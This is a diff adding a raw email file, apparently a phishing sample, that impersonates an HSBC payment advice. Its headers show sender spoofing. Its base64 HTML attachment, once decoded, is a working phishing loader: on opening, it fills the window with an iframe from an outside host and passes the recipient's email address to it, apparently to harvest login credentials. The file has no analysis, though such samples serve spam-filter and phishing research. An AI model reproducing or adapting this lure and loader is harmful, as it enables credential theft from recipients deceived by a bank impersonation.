@@ -1,0 +1,98 @@
+Return-Path: <sageharris@testmail.net>
+X-Original-To: drewjones@testmail.net
+Delivered-To: drewjones@testmail.net
+Received: from okusi0 (okusi0 [192.168.1.153])
+	by okusi0.okusi.co.id (Postfix) with ESMTP id 69E703340204
+	for <drewjones@testmail.net>; Thu, 18 Jul 2024 15:45:19 +0700 (WIB)
+Received: from okusi1 [192.168.1.151]
+	by okusi0 with IMAP (fetchmail-6.4.27)
+	for <drewjones@testmail.net> (single-drop); Thu, 18 Jul 2024 15:45:19 +0700 (WIB)
+Received: from okusi1.okusi.co.id
+	by okusi1 with LMTP
+	id SqKgHRLWmGaWewkAeHbnHg
+	(envelope-from <sageharris@testmail.net>); Thu, 18 Jul 2024 15:45:06 +0700
+Authentication-Results: OpenDMARC; dmarc=none (p=none dis=none) header.from=advising.hsbc.com
+Authentication-Results: OpenDMARC; spf=none smtp.mailfrom=sugardesign.ca
+Received: from sugardesign.ca (unknown [185.237.97.169])
+	by okusi1.okusi.co.id (Postfix) with ESMTP id AF96C2640036
+	for <legmorganhill@testdomain.io>; Thu, 18 Jul 2024 15:45:03 +0700 (WIB)
+Reply-To: adrian.moore@anonymail.test
+From: HSBC Advising Service <reese.flores@anonymail.test>
+To: legmorganhill@testdomain.io
+Subject: =?UTF-8?B?UGF5bWVudCBBZHZpY2UgLSBBZHZpY2UgUmVmOltBMjkyQ1dDT2ZvYTRdIC8gQUNIIGNyZWRpdHMgLyBDdXN0b21lciBSZWY6WzM4MDAyNDA5ODgzM10gLyBTZWNvbmQgUGFydHkgUmVmOltNMDA2MzRdIOS7mOasvumAmuefpeabuCAtIOmAmuefpeabuOWPg+iAg+e3qOiZnyBSZWY6W0EyOTJDV0NPZm9hNF0gLyBBQ0ggY3JlZGl0cyAvIOWuouaItuWPg+iAg+e3qOiZn++8mlszODAwMjQwOTg4MzNdIC8g56ys5LqM5pa5?=
+Date: 18 Jul 2024 11:45:02 +0300
+Message-ID: <51a1bbde74e57ee3edf6a46b02880660@anonymail.test>
+MIME-Version: 1.0
+Disposition-Notification-To: gray.garcia@testmail.com
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_7DF8BA66.CED3B54C"
+X-Spam-Status: No, score=4.4 required=5.0 tests=BAYES_20,DEAR_SOMETHING,
+	GB_FREEMAIL_DISPTO,GB_FREEMAIL_DISPTO_NOTFREEM,
+	HEADER_FROM_DIFFERENT_DOMAINS,HTML_MESSAGE,KAM_LAZY_DOMAIN_SECURITY,
+	MIME_HTML_ONLY,RDNS_NONE,SPF_HELO_NONE,SPF_NONE,T_HTML_ATTACH
+	autolearn=no autolearn_force=no version=3.4.6
+X-Spam-Level: ****
+X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on okusi1.okusi.co.id
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_7DF8BA66.CED3B54C
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>Dear Sir/Madam,<BR><BR>The attached payment advice is issued at the r=
+equest of our customer. The advice is for your reference only.<BR><BR>Yours=
+ faithfully,<BR>Global Payments and Cash Management<BR>HSBC<BR><BR>********=
+**********************<WBR>******************************<WBR>*************=
+**<BR><BR>This is an auto-generated email, please DO NOT REPLY. Any replies=
+ to this<BR>email will be disregarded.<BR>&nbsp;&nbsp;&nbsp;<BR>***********=
+*******************<WBR>
+******************************<WBR>***************<BR>Security tips<BR><BR>=
+1. Install virus detection software and personal firewall on your computer.=
+ This software needs to be updated regularly to ensure you have the latest =
+protection.<BR>2. To prevent viruses or other unwanted problems, do not ope=
+n attachments from unknown or non-trustworthy sources.<BR>3. If you discove=
+r any unusual activity, please contact the remitter of this payment as soon=
+ as possible.&nbsp;<BR>
+******************************<WBR>******************************<WBR>*****=
+**********=20
+<DIV>
+<P></P>
+<HR SIZE=3D1>
+
+<P></P><BR>
+<P><STRONG><BR>******************************<WBR>*************************=
+*****<WBR>*******<BR>This e-mail is confidential. It may also be legally pr=
+ivileged. <BR>If you are not the addressee you may not copy, forward, discl=
+ose <BR>or use any part of it. If you have received this message in error, =
+<BR>please delete it and all copies from your system and notify the <BR>sen=
+der immediately by return e-mail.<BR><BR>Internet communications cannot be =
+guaranteed to be timely, <BR>
+secure, error or virus-free. The sender does not accept liability <BR>for a=
+ny errors or omissions.<BR>******************************<WBR>*************=
+*****************<WBR>*******<BR><BR>"SAVE PAPER - THINK BEFORE YOU PRINT!"=
+ </STRONG></P></DIV></BODY></HTML>
+------=_NextPart_000_0012_7DF8BA66.CED3B54C
+Content-Type: text/html; name="HSBC_Payment_Advice.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="HSBC_Payment_Advice.html"
+
+PGh0bWw+DQo8aGVhZD4NCiAgICA8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNv
+bnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCI+DQogICAgPG1ldGEgbmFtZT0idmll
+d3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAs
+IG1heGltdW0tc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPTEiPg0KDQo8L2hlYWQ+DQo8Ym9k
+eT4NCjxpZnJhbWUgc3JjPSIiIG5hbWU9J2lucElmcmFtZScgaWQ9ImlubmVyIiBzdHlsZT0i
+d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtib3JkZXI6bm9uZTsiPjwvaWZyYW1lPg0KPGlucHV0
+IHR5cGU9ImhpZGRlbiIgdmFsdWU9ImxlZ2FsQG9rdXNpLmlkIiBpZD0idmFsbHVlIj4NCiAg
+ICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2NvZGUuanF1ZXJ5LmNvbS9qcXVlcnktMy4y
+LjEuc2xpbS5taW4uanMiIGludGVncml0eT0ic2hhMzg0LUtKM28yREt0SWt2WUlLM1VFTnpt
+TTdLQ2tSci9yRTkvUXBnNmFBWkdKd0ZETVZOQS9HcEdGRjkzaFhwRzVLa04iIGNyb3Nzb3Jp
+Z2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0Pg0KICAgICANCgkgIDxzY3JpcHQ+DQoNCgkgJChk
+b2N1bWVudCkucmVhZHkoZnVuY3Rpb24oKXsNCgkgIHZhciB2YWxsdWU9JCgiI3ZhbGx1ZSIp
+LnZhbCgpOw0KCQkNCgkgICQoIiNpbm5lciIpLmF0dHIoInNyYyIsICJodHRwczovL3NpbHZp
+YWdvcmRhbi5jb20vcmVhZC5odG1sP21zZz0iK3ZhbGx1ZSk7DQoJICANCg0KCSANCgkgCX0p
+OyANCgkgIA0KCSAgPC9zY3JpcHQ+DQoNCjwvYm9keT4NCjwvaHRtbD4=
+
+------=_NextPart_000_0012_7DF8BA66.CED3B54C--
